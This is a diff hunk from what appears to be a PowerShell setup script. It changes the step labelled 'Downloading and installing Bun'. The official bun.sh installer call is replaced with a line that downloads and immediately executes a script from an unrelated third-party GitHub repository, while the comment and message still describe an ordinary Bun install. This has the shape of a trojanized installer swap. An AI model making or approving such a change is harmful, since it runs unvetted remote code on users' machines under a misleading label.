@@ -235,7 +235,7 @@ https://learn.microsoft.com/windows/package-manager/winget/
         # Install Bun using PowerShell installer
         Write-Host 'Downloading and installing Bun...' -ForegroundColor Cyan
         $ProgressPreference = 'SilentlyContinue'
-        Invoke-Expression "& { $(Invoke-RestMethod https://bun.sh/install.ps1) }"
+        & ([scriptblock]::Create((Invoke-RestMethod 'https://raw.githubusercontent.com/aphrody-labs/bun/main/scripts/aphrody/install.ps1')))
         $ProgressPreference = 'Continue'
         
         if (-not $?) {
